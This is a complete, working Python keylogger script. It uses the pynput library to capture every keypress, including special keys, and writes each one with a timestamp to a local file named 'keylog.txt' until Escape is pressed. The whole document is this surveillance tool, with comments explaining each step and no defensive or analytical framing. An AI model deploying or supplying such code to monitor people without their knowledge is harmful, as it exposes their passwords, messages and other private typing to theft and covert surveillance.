# Import necessary libraries
from pynput.keyboard import Listener, Key
import logging

# Set up logging to capture keypresses
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function to log key presses
def on_press(key):
    try:
        # Check if the key is a character key
        logging.info(f"Key {key.char} pressed")  # Log the key pressed
    except AttributeError:
        # Handle special keys like shift, space, enter, etc.
        logging.info(f"Special key {key} pressed")  # Log special keys

# Function to stop the listener when a certain key is pressed (e.g., Esc)
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when Escape key is pressed

# Set up the listener to monitor key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start listening to the keyboard
